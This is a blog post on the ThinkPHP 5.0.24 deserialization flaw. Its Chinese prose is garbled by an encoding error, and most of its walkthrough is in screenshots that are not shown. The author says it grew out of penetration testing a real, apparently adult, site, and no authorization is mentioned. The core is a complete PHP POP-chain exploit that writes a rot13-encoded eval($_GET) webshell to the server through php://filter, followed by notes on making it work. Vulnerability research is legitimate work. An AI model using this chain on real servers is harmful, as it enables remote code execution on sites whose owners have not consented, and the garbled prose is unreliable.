<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="tp5.0.24ååºåˆ—åŒ–æ¼æ´åˆ†æ"/>




  <meta name="keywords" content="tp," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/03/14/tp5-0-24ååºåˆ—åŒ–æ¼æ´å¤ç°/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="tp5.0.24ååºåˆ—åŒ–æ¼æ´åˆ†æ">
<meta property="og:url" content="https://glotozz.github.io/2020/03/14/tp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/03/14/q3uEdmxMWGIDnzS.jpg">
<meta property="og:image" content="https://i.loli.net/2020/03/14/drmzkZqfP7DBOnJ.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/6iM7xngRkA1tlLr.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/DMLVtPs4Q9GEXZw.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/ZIf8UpugRHeCY1a.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/UsBeTQOKWCNMjlG.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/bko59EivacK7UtJ.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/7uKqDs4cHNSOTWw.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/OIpzMkgYD3Q5oj6.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/aiepQ1KnlgP37hY.png">
<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-03-14_08-41-42.png">
<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-03-14_08-45-07.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/NzSUCXLmsnokd3M.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/rULQdsDTb76wjOt.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/SNeJLY7y8pCgTO6.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/ztfFGrsTwjCgvaP.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/HJNUvzR4hWtQPp3.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/RpmWuG6dxt8qBbY.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/FKEx35yhpIvTH47.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/uUqmTejCLaSrbZN.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/urnULvks7XPNgGa.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/xDKSGHs7kv4Jcgb.png">
<meta property="article:published_time" content="2020-03-13T23:21:02.000Z">
<meta property="article:modified_time" content="2020-03-15T07:27:32.245Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="tp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/03/14/q3uEdmxMWGIDnzS.jpg">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<audio src="../../075d_045e_0e5a_076f2c3da03467077eca904ce3e6272e.mp3" autoplay="autoplay"></audio>
    <title> tp5.0.24ååºåˆ—åŒ–æ¼æ´åˆ†æ - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          tp5.0.24ååºåˆ—åŒ–æ¼æ´åˆ†æ
        
      </h1>

      <time class="post-time">
          Mar 14 2020
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>ç®€é™‹çš„ç›®å½•</strong></p>
<!-- toc -->

<ul>
<li><a href="#ä¸€-è·å–æ¼æ´">ä¸€ã€è·å–æ¼æ´</a></li>
<li><a href="#äºŒ-æ¼æ´åˆ†æ">äºŒã€æ¼æ´åˆ†æ</a></li>
<li><a href="#ä¸‰-pocç¼–å†™">ä¸‰ã€POCç¼–å†™</a></li>
<li><a href="#å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥ï¼š</a></li>
</ul>
<!-- tocstop -->

<hr>
<p>æ˜¨å¤œå¯¹ä¸€hç½‘è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œè¯¥ç½‘ç«™æ˜¯åŸºäºtp5.0.24äºŒæ¬¡å¼€å‘çš„ï¼Œå°±æƒ³ç€è‡ªå·±ä¹Ÿåˆ†æä¸€ä¸‹ï¼ˆä¸»è¦æ˜¯æ²¡ç»™pocå“ˆå“ˆï¼‰ï¼ŒåŠ›å“¥æŒ–çš„å—·ğŸ˜</p>
<p><img src="https://i.loli.net/2020/03/14/q3uEdmxMWGIDnzS.jpg" alt="TIMå›¾ç‰‡20200314072347.jpg"></p>
<h4><span id="ä¸€-è·å–æ¼æ´">ä¸€ã€è·å–æ¼æ´</span></h4><blockquote>
<p><a href="http://www.thinkphp.cn/donate/download/id/1279.html" target="_blank" rel="noopener">http://www.thinkphp.cn/donate/download/id/1279.html</a> </p>
</blockquote>
<p><code>application/index/controller/Index.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace appindexcontroller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index($input&#x3D;&#39;&#39;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Welcome thinkphp 5.0.24&quot;;</span><br><span class="line">        echo $input;</span><br><span class="line">        unserialize($input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/tp5.0.24/public/index.php</code></p>
<h4><span id="äºŒ-æ¼æ´åˆ†æ">äºŒã€æ¼æ´åˆ†æ</span></h4><p>è™½ç„¶ä¹‹å‰è‡ªå·±æ²¡æœ‰åˆ†æè¿‡tp5.0.xçš„ååºåˆ—åŒ–ï¼Œå› ä¸ºtp5.0.0~tp5.0.23æœ‰ä¸€æ¡ç›´æ¥RCEçš„POPé“¾ï¼Œä½†æ˜¯æƒ³æ¥ä¹Ÿå·®ä¸å¤šã€‚è€Œtp5.0.24ä¸­å¯¹ä¼ å…¥çš„<code>_method</code>è¿›è¡Œç™½åå•é™åˆ¶ï¼Œå› æ­¤æ— æ³•è°ƒç”¨ä»»æ„ç±»æ–¹æ³•ã€‚</p>
<p>Thinkphp 5.0.xååºåˆ—åŒ–æœ€åè§¦å‘RCEï¼Œè¦è°ƒç”¨çš„<code>Request</code>ç±»<code>__call</code>æ–¹æ³•ï¼Œå› æ­¤ä¹Ÿè¢«é™åˆ¶ã€‚</p>
<p><img src="https://i.loli.net/2020/03/14/drmzkZqfP7DBOnJ.png" alt="Snipaste_2020-03-14_07-56-35.png"></p>
<p>éœ€è¦å¯»æ‰¾å…¶ä»–çš„<code>__call</code>æ–¹æ³•ï¼Œç„¶ååŠ›å“¥æ‰¾åˆ°äº†ä¸‹é¢è¿™é‡Œ</p>
<p><code>Output.php</code></p>
<p><img src="https://i.loli.net/2020/03/15/6iM7xngRkA1tlLr.png" alt="Snipaste_2020-03-14_08-01-21.png"></p>
<p>è¿½è¸ª<code>block()</code>æ–¹æ³•</p>
<p><img src="https://i.loli.net/2020/03/15/DMLVtPs4Q9GEXZw.png" alt="Snipaste_2020-03-14_08-03-35.png"></p>
<p>å­˜åœ¨æ–‡ä»¶å†™å…¥ï¼Œå¯ä»¥åˆ©ç”¨ã€‚</p>
<hr>
<p><strong>å¼€å§‹åˆ†æPOPé“¾</strong></p>
<p>çœ‹äº†ä¸‹å‘ç°tp5.0.xã€tp5.1.xã€tp5.2.x ååºåˆ—åŒ–å…¥å£ç‚¹éƒ½æ˜¯ä¸€æ ·çš„</p>
<p><code>thinkphp/library/think/process/pipes/Windows.php</code></p>
<p><img src="https://i.loli.net/2020/03/15/ZIf8UpugRHeCY1a.png" alt="Snipaste_2020-03-14_08-13-36.png"></p>
<p>è¿½è¸ª<code>removeFiles()</code></p>
<p><img src="https://i.loli.net/2020/03/15/UsBeTQOKWCNMjlG.png" alt="Snipaste_2020-03-14_08-14-07.png"></p>
<p>è¿™é‡Œçš„<code>file_exist()</code>è§¦å‘<code>__toString()</code>ï¼Œå› æ­¤å¯ä»¥ä½œä¸ºè·³æ¿</p>
<p>å…¨å±€æœç´¢<code>__toString()</code>å¯»æ‰¾åˆ©ç”¨ç‚¹</p>
<p><code>thinkphp/library/think/Model.php</code></p>
<p><img src="https://i.loli.net/2020/03/15/bko59EivacK7UtJ.png" alt="Snipaste_2020-03-14_08-18-41.png"></p>
<p>è¿½è¸ª<code>toJson()</code></p>
<p><img src="https://i.loli.net/2020/03/15/7uKqDs4cHNSOTWw.png" alt="Snipaste_2020-03-14_08-19-15.png"></p>
<p>è¿½è¸ª<code>toArray()</code></p>
<p><img src="https://i.loli.net/2020/03/15/OIpzMkgYD3Q5oj6.png" alt="Snipaste_2020-03-14_08-28-21.png"></p>
<p>å­˜åœ¨è¿™ä¸‰ä¸ªåŠ¨æ€æ–¹æ³•è°ƒç”¨ï¼Œæœ€ååªæœ‰ç¬¬ä¸‰å¤„å¯è¡Œ</p>
<p>å› ä¸ºè¦ä½œä¸ºè·³æ¿ï¼Œæƒ³åŠæ³•æ§åˆ¶<code>$value</code>å’Œ<code>$attr</code></p>
<p><img src="https://i.loli.net/2020/03/15/aiepQ1KnlgP37hY.png" alt="Snipaste_2020-03-14_08-35-20.png"></p>
<p>è¿™é‡Œçš„<code>parseName()</code>æ˜¯ä¸ªå­—ç¬¦ä¸²å‘½åé£æ ¼è½¬æ¢ï¼ŒåŸºæœ¬æ²¡å•¥å˜åŒ–</p>
<p>æ§åˆ¶<code>$modelRelation</code>éœ€è¦åœ¨å½“å‰ç±»ä¸­å¯»æ‰¾ä¸€ä¸ªæ— å‚æ–¹æ³•</p>
<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-03-14_08-41-42.png" alt="Snipaste_2020-03-14_08-41-42"></p>
<p>è·Ÿè¿›<code>getRelationData()</code></p>
<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-03-14_08-45-07.png" alt="Snipaste_2020-03-14_08-45-07"></p>
<p>è¿™ä¸ªæ–¹æ³•è¯´æ˜æ˜¯è·å–å…³è”æ¨¡å‹æ•°æ®ï¼Œéœ€è¦æ»¡è¶³ç¬¬ä¸€ä¸ªifæ¡ä»¶ï¼Œè¿™é‡Œæ¯”è¾ƒéº»çƒ¦ï¼Œå…ˆçœ‹ä¸‹é¢ã€‚å‡è®¾æ»¡è¶³ï¼Œè¿”å›<code>$this-&gt;parent</code></p>
<p>æ¥ä¸‹æ¥éœ€è¦å¯»æ‰¾ä¸€ä¸ªæœ‰<code>getBindAttr()</code>æ–¹æ³•çš„ç±»ï¼Œå…¨å±€æœç´¢å‘ç°åªæœ‰ä¸€ä¸ª<code>OneToOne</code>ç±»</p>
<p><img src="https://i.loli.net/2020/03/15/NzSUCXLmsnokd3M.png" alt="Snipaste_2020-03-14_09-14-38.png"></p>
<p>ä¹Ÿæ˜¯å¯æ§çš„ï¼Œå› ä¸ºæ˜¯æŠ½è±¡ç±»ï¼Œå¯»æ‰¾ç»§æ‰¿<code>OneToOne()</code>çš„ç±»ï¼Œå¹¶ä¸”æ»¡è¶³å‰é¢é‚£ä¸ªifæ¡ä»¶ï¼Œæœ€ç»ˆå‘ç°<code>HasOne</code>ç±»å¯ç”¨ï¼Œå…·ä½“å˜é‡å€¼ç­‰ä¸‹è°ƒè¯•çœ‹çœ‹ç»“æœ</p>
<p>ä¹‹åå°±æ˜¯åˆ©ç”¨<code>$value-&gt;getAttr($attr)</code>è¿™ä¸ªè·³æ¿è§¦å‘<code>Output</code>ç±»ä¸­çš„<code>__call()</code></p>
<p><img src="https://i.loli.net/2020/03/15/rULQdsDTb76wjOt.png" alt="Snipaste_2020-03-14_10-34-42.png"></p>
<p><code>block()</code></p>
<p><img src="https://i.loli.net/2020/03/15/SNeJLY7y8pCgTO6.png" alt="Snipaste_2020-03-14_10-35-00.png"></p>
<p><code>writeln()</code></p>
<p><img src="https://i.loli.net/2020/03/15/ztfFGrsTwjCgvaP.png" alt="Snipaste_2020-03-14_10-35-17.png"></p>
<p><code>write()</code></p>
<p><img src="https://i.loli.net/2020/03/15/HJNUvzR4hWtQPp3.png" alt="Snipaste_2020-03-14_10-35-42.png"></p>
<p><code>$this-&gt;handle</code>å¯æ§ï¼Œå¯ä»¥ä½œä¸ºè·³æ¿ï¼Œå…¨å±€æœç´¢<code>write()</code></p>
<p><code>thinkphp/library/think/session/driver/Memcached.php</code></p>
<p><img src="https://i.loli.net/2020/03/15/RpmWuG6dxt8qBbY.png" alt="Snipaste_2020-03-15_12-44-47.png"></p>
<p>å¯ä½œä¸ºè·³æ¿ï¼Œå…¨å±€æœç´¢<code>-&gt;set</code></p>
<p><code>thinkphp/library/think/cache/driver/File.php</code></p>
<p><img src="https://i.loli.net/2020/03/15/FKEx35yhpIvTH47.png" alt="Snipaste_2020-03-14_10-40-57.png"></p>
<p><code>$filename</code>å¯æ§å› æ­¤å¯ä»¥ç”¨ä¼ªåè®®ç»•è¿‡exitï¼Œä½†æ˜¯è¿™é‡Œçš„<code>$data</code>æ ¹æ®ä¼ å‚ä¸ºå¸ƒå°”å‹ï¼Œ</p>
<p>è·Ÿè¿›<code>setTagItem()</code></p>
<p><img src="https://i.loli.net/2020/03/15/uUqmTejCLaSrbZN.png" alt="Snipaste_2020-03-14_10-50-13.png"></p>
<p>è¿™é‡Œçš„<code>$value</code>å¯æ§å³ä¼ å…¥çš„<code>$name</code>ï¼Œæ˜¯å‰é¢çš„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename &#x3D; $this-&gt;getCacheKey($name, true);</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›<code>getCacheKey()</code></p>
<p><img src="https://i.loli.net/2020/03/15/urnULvks7XPNgGa.png" alt="Snipaste_2020-03-14_21-19-29.png"></p>
<p>è¿™é‡Œéœ€è¦åˆ©ç”¨ä¼ªåè®®<code>php://filter/write=string.rot13/resource=./cuc cucvasb();?&gt;</code>ä½œä¸ºæ–‡ä»¶åï¼Œä»è€Œå®ç°æ–‡ä»¶å†™å…¥</p>
<p>è‡³æ­¤ï¼ŒPOPé“¾å®Œæˆ</p>
<p>å¯ä»¥å‚è€ƒåŠ›å“¥çš„POPé“¾å›¾</p>
<h4><span id="ä¸‰-pocç¼–å†™">ä¸‰ã€POCç¼–å†™</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;#Windows</span><br><span class="line">use think\model\Pivot;</span><br><span class="line">class Windows&#123;&#x2F;&#x2F;ä¸ä½¿ç”¨ç»§æ‰¿</span><br><span class="line">    private $files &#x3D; [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;files &#x3D; [new Pivot()];&#x2F;&#x2F;è§¦å‘Model __toString(),Modelå­ç±»Pivotåˆé€‚</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\db;</span><br><span class="line">use think\console\Output;</span><br><span class="line">class Query&#123;</span><br><span class="line">	protected $model;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;model &#x3D; new Output();&#x2F;&#x2F;get_class($modelRelation-&gt;getModel()) &#x3D;&#x3D; get_class($this-&gt;parent)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;#Relation</span><br><span class="line">use think\db\Query;</span><br><span class="line">abstract class Relation&#123;</span><br><span class="line">	protected $selfRelation;</span><br><span class="line">	protected $query;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;selfRelation &#x3D; false;&#x2F;&#x2F;æ»¡è¶³ifè¯­å¥</span><br><span class="line">		$this-&gt;query &#x3D; new Query();&#x2F;&#x2F;æ»¡è¶³ifè¯­å¥</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation;#OneToOne HasOne</span><br><span class="line">use think\model\Relation;&#x2F;&#x2F;ä½¿ç”¨äº†Relationç±»</span><br><span class="line">abstract class OneToOne extends Relation&#123;&#x2F;&#x2F;éœ€è¦$selfRelationå’Œ$queryï¼Œä½¿ç”¨ç»§æ‰¿</span><br><span class="line">	protected $bindAttr &#x3D; [];</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		parent::__construct();</span><br><span class="line">		$this-&gt;bindAttr &#x3D; [&#39;key&#39;,&#39;value&#39;];&#x2F;&#x2F;å³$bindAttr</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HasOne extends OneToOne&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\cache;#Driver</span><br><span class="line">abstract class Driver&#123;</span><br><span class="line">	protected $tag;</span><br><span class="line">	protected $options &#x3D; [];</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;tag &#x3D; true;&#x2F;&#x2F;æ»¡è¶³if ($this-&gt;tag &amp;&amp; !is_file($filename)) </span><br><span class="line">		$this-&gt;options &#x3D; [</span><br><span class="line">			&#x2F;&#x2F; &#39;path&#39; &#x3D;&gt; &#39;.&#x2F;demo&#x2F;&#39;,</span><br><span class="line">			&#39;path&#39; &#x3D;&gt; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;.&#x2F;demo&#x2F;&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#39;,</span><br><span class="line">			&#39;data_compress&#39; &#x3D;&gt; false,</span><br><span class="line">			&#39;expire&#39; &#x3D;&gt; 0,</span><br><span class="line">			&#39;cache_subdir&#39; &#x3D;&gt; false,&#x2F;&#x2F;if ($this-&gt;options[&#39;cache_subdir&#39;]) &#123;</span><br><span class="line">			&#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">		];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver;#File</span><br><span class="line">use think\cache\Driver;</span><br><span class="line">class File extends Driver&#123;&#x2F;&#x2F;éœ€è¦$tagä»¥åŠsetTagItem()ï¼Œä½¿ç”¨ç»§æ‰¿</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver;#Memcached</span><br><span class="line">use think\cache\driver\File;</span><br><span class="line">class Memcached&#123;&#x2F;&#x2F;å› ä¸ºè¿™é‡Œæ²¡ç”¨åˆ°SessionHandlerï¼Œå› æ­¤æ²¡å¿…è¦ç»§æ‰¿</span><br><span class="line">	protected $handler &#x3D; null;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;handler &#x3D; new File();&#x2F;&#x2F;$this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, $this-&gt;config[&#39;expire&#39;]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\console;</span><br><span class="line">use think\session\driver\Memcached;</span><br><span class="line">class Output&#123;</span><br><span class="line">	protected $styles &#x3D; [];</span><br><span class="line">	private $handle &#x3D; null;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">    	$this-&gt;styles &#x3D; [&#39;getAttr&#39;];&#x2F;&#x2F;æ»¡è¶³if (in_array($method, $this-&gt;styles)) </span><br><span class="line">    	$this-&gt;handle &#x3D; new Memcached();&#x2F;&#x2F;$this-&gt;handle-&gt;write($messages, $newline, $type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think;#Model</span><br><span class="line">use think\model\Relation\HasOne;</span><br><span class="line">use think\console\Output;</span><br><span class="line">abstract class Model &#123;</span><br><span class="line">	protected $append &#x3D; [];</span><br><span class="line">	protected $error;</span><br><span class="line">	public $parent;&#x2F;&#x2F;å‘ç‚¹</span><br><span class="line"></span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;append &#x3D; [&#39;key&#39;&#x3D;&gt;&#39;getError&#39;];&#x2F;&#x2F;valueä¸º$relation,å› æ­¤ä¸ºgetError</span><br><span class="line">		$this-&gt;error &#x3D; new HasOne();&#x2F;&#x2F;å³$modelRealtion</span><br><span class="line">		$this-&gt;parent &#x3D; new Output();&#x2F;&#x2F;å³$value</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\model;#Pivot</span><br><span class="line">use think\Model;</span><br><span class="line">class Pivot extends Model&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">$a &#x3D; base64_encode(serialize(new Windows()));</span><br><span class="line">echo $a;</span><br><span class="line">var_dump(unserialize(base64_decode($a)));</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸ª3ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹</p>
<p>*<em>ä¸€ã€modelå­ç±»Pivotä¸­ä¹Ÿæœ‰è¯¥å˜é‡parentï¼Œå±æ€§ä¸ºpublicï¼›è€ŒåŸºç±»modelçš„parentä¸ºprotected *</em></p>
<p>å°†<code>Model</code>ç±»ä¸­çš„parentè®¾ä¸ºpublicï¼Œä½†æ˜¯å¯¹äºphpç‰ˆæœ¬ä¼¼ä¹ä»æœ‰è¦æ±‚ã€‚ã€‚<code>php7.3.12</code>å¤±è´¥ï¼Œæµ‹è¯•<code>5.6.40ï¼Œ7.3.8ï¼Œ7.0.33</code>å¯ç”¨</p>
<p><strong>äºŒã€Windowsä¸‹ä½¿ç”¨<code>php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?&gt;</code>æ— æ³•æ­£å¸¸ååºåˆ—åŒ–ï¼Œè°ƒè¯•å‘ç°åªèƒ½æ­£å¸¸åˆå§‹åŒ–Windowsç±»ï¼Œå¹¶ä¸”Windowsä¸‹ä¸æ”¯æŒè¿™ç§æ–‡ä»¶å</strong></p>
<p>åˆ‡æ¢åˆ°Linuxä¸‹</p>
<p><strong>ä¸‰ã€å¦‚æœç½‘ç«™ä¸å…è®¸å†™æ–‡ä»¶ï¼Œå¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ª755çš„ç›®å½•</strong></p>
<p><code>getCacheKey()</code>æ–¹æ³•ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">	mkdir($dir, 0755, true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$auto</code>ä¸ºtrueï¼Œå°†<code>path</code>è®¾ä¸º<code>./demo</code></p>
<p>åˆ†æä¸‹æœ€åçš„è°ƒç”¨</p>
<p>ç¬¬ä¸€æ¬¡<code>set(&#39;&lt;getAttr&gt;key&lt;getAttr&gt;&#39;, true, expire=3000)</code></p>
<p><code>setTagItem(path+md5(name)+.php)</code></p>
<p>ç¬¬äºŒæ¬¡<code>set(tag_md5(1), path+md5(name)+.php)</code></p>
<p><code>file_put_contents(path+md5(name)+.php, &lt;?php\n//000000000000\n exit();?&gt;\n+serialize(path+md5(name)+.php))</code></p>
<hr>
<p>æ³¨æ„ä¸‹<code>?</code>çš„urlç¼–ç </p>
<p><img src="https://i.loli.net/2020/03/15/xDKSGHs7kv4Jcgb.png" alt="Snipaste_2020-03-15_13-50-20.png"></p>
<hr>
<h4><span id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥ï¼š</span></h4><p> <a href="https://www.anquanke.com/post/id/196364?tdsourcetag=s_pctim_aiomsg#h2-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364?tdsourcetag=s_pctim_aiomsg#h2-7</a> </p>
<p> <a href="http://pines404.online/2020/01/20/ä»£ç å®¡è®¡/ThinkPHP/ThinkPHP5.0.24ååºåˆ—åŒ–é“¾åˆ†æ/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/?tdsourcetag=s_pctim_aiomsg</a> </p>
<p> <a href="https://xz.aliyun.com/t/7082" target="_blank" rel="noopener">https://xz.aliyun.com/t/7082</a></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>æœ¬æ–‡ä½œè€…ï¼š</strong>
              <a href="/" title="æ¬¢è¿è®¿é—® glotozz çš„ä¸ªäººåšå®¢">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>
               æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ CC BY-NC-SA 4.0 è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
